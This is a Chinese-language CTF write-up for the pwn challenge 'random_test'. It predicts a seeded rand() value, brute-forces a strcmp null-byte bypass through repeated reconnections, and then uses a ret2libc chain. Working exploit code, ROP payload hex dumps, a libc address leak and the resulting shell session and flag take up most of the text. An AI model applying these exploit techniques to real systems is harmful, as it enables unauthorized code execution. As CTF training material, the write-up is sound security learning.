# random_test

`rand()` 和 `srand()` 生成的都是伪随机数，本地模拟即可。

```
.data:0000000000404010 n1              dd 1BF52h               ; DATA XREF: test1+28↑r
.data:0000000000404014 n2              dd 721h                 ; DATA XREF: test1+49↑r
.data:0000000000404018 n3              dd 386B659h
```

```c
srand(0x1bf52);
for (int i = 0; i < 3; i++) rand();
unsigned int v3 = rand() % 0x721;
```

```bash
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5 $ gcc -O2 -o get_rand_1 get_rand_1.c 
(.venv) scetayh@tarikko-gentoo ~/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5 $ ./get_rand_1 
800
```

在测试 2 中，赌随机数的第一个字节是 `\0` ，这样 `strcmp()` 会在比较第一个字后便因遇到终止符而停止。赌失败了就关掉重连，直到刷出 `\0` 。

```python
while True:
    io = remote("node10.anna.nssnode.cn", 29570)
    
    io.sendlineafter(b"Please input the first number: \n", b"800")

    io.sendafter(b"Please input the second number: \n", b"\x00" * 0x1f)
    result = io.recvuntil((b"Wrong.", b"Oh, you did it!"), timeout=3)
    if b"Oh, you did it!" in result:
        break
    else:
        io.close()
```

最终的 `vuln()` 是一个简单的 ret2libc 。

运行脚本后得到 shell ：

```bash
# ...
# after 67 attempts
[*] Attempt count: 68
[+] Opening connection to node10.anna.nssnode.cn on port 28569: Done
[DEBUG] Received 0x13 bytes:
    b"It's a random test."
[DEBUG] Received 0x33 bytes:
    b'\n'
    b'What will you do?\n'
    b'Please input the first number: \n'
[DEBUG] Sent 0x4 bytes:
    b'800\n'
[DEBUG] Received 0x1e bytes:
    b'Ok, you passed the first test.'
[DEBUG] Received 0x43 bytes:
    b'\n'
    b'.\n'
    b'.\n'
    b'.\n'
    b'What about the second one?\n'
    b'Please input the second number: \n'
[DEBUG] Sent 0x1f bytes:
    b'\x00' * 0x1f
[DEBUG] Received 0x7 bytes:
    b'Wrong.\n'
[*] Closed connection to node10.anna.nssnode.cn port 28569
[*] Attempt count: 69
[+] Opening connection to node10.anna.nssnode.cn on port 28569: Done
[DEBUG] Received 0x13 bytes:
    b"It's a random test."
[DEBUG] Received 0x33 bytes:
    b'\n'
    b'What will you do?\n'
    b'Please input the first number: \n'
[DEBUG] Sent 0x4 bytes:
    b'800\n'
[DEBUG] Received 0x1e bytes:
    b'Ok, you passed the first test.'
[DEBUG] Received 0x43 bytes:
    b'\n'
    b'.\n'
    b'.\n'
    b'.\n'
    b'What about the second one?\n'
    b'Please input the second number: \n'
[DEBUG] Sent 0x1f bytes:
    b'\x00' * 0x1f
[DEBUG] Received 0xf bytes:
    b'Oh, you did it!'
/home/scetayh/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5/exp.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendafter("Input something: \n", flat("A" * (96 + 8), msg).ljust(0x200, b"A"))
/home/scetayh/Projects/nssctf-fall-recruitment-2026-writeups/.venv/lib/python3.14/site-packages/pwnlib/tubes/tube.py:922: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x32 bytes:
    b'\n'
    b'Now you have a chance to hack.\n'
    b'Input something: \n'
[DEBUG] Sent 0x200 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  41 41 41 41  33 15 40 00  00 00 00 00  │AAAA│AAAA│3·@·│····│
    00000070  a8 3f 40 00  00 00 00 00  c4 10 40 00  00 00 00 00  │·?@·│····│··@·│····│
    00000080  6b 14 40 00  00 00 00 00  41 41 41 41  41 41 41 41  │k·@·│····│AAAA│AAAA│
    00000090  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000200
/home/scetayh/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5/exp.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Ok.")
[DEBUG] Received 0x3 bytes:
    b'Ok.'
/home/scetayh/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5/exp.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("\x0a")
[DEBUG] Received 0x1a bytes:
    00000000  0a 20 24 40  ec a0 7d 0a  49 6e 70 75  74 20 73 6f  │· $@│··}·│Inpu│t so│
    00000010  6d 65 74 68  69 6e 67 3a  20 0a                     │meth│ing:│ ·│
    0000001a
[*] puts_got = b' $@\xec\xa0}\x00\x00'
[*] libc.address = 138130111324160
[DEBUG] Sent 0x200 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  41 41 41 41  1f 40 3a ec  a0 7d 00 00  │AAAA│AAAA│·@:·│·}··│
    00000070  00 00 00 00  00 00 00 00  31 74 49 ec  a0 7d 00 00  │····│····│1tI·│·}··│
    00000080  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000090  04 1b 46 ec  a0 7d 00 00  41 41 41 41  41 41 41 41  │··F·│·}··│AAAA│AAAA│
    000000a0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000200
/home/scetayh/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5/exp.py:57: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("Ok.")
[DEBUG] Received 0x3 bytes:
    b'Ok.'
/home/scetayh/Projects/nssctf-fall-recruitment-2026-writeups/pwn/5/exp.py:58: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil("\x0a")
[DEBUG] Received 0x1 bytes:
    b'\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x44 bytes:
    b'attachment\n'
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'ld-2.31.so\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libc.so.6\n'
    b'libx32\n'
attachment
bin
dev
flag
ld-2.31.so
lib
lib32
lib64
libc.so.6
libx32
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'NSSCTF{02d61f6f-0f55-4b4a-8f1d-975f0eb5b252}\n'
NSSCTF{02d61f6f-0f55-4b4a-8f1d-975f0eb5b252}
$  
```

Flag 为 `NSSCTF{02d61f6f-0f55-4b4a-8f1d-975f0eb5b252}` 。